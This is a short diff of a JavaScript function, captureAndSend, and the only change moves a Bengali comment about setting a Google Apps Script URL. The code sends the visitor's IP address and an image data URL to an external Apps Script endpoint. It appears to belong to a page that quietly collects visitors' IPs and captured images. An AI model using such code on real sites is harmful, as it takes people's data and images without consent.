@@ -22,7 +22,8 @@ async function captureAndSend() {
 
     const ip = await getIP();
 
-    const webAppUrl = "https://script.google.com/macros/s/AKfycbzqwhdYfb9DTRQXi5iZOU_qeuE4-DfbS33V0B6aNomoOqphGbVhZes_wr_PJK3OdbVX/exec"; // এখানে Step 3 এর URL বসান
+    // এখানে আপনার Google Apps Script Web App URL দিন
+    const webAppUrl = "https://script.google.com/macros/s/AKfycbzqwhdYfb9DTRQXi5iZOU_qeuE4-DfbS33V0B6aNomoOqphGbVhZes_wr_PJK3OdbVX/exec";
 
     await fetch(webAppUrl + `?ip=${encodeURIComponent(ip)}&imageUrl=${encodeURIComponent(dataURL)}`, {
       method: 'POST'
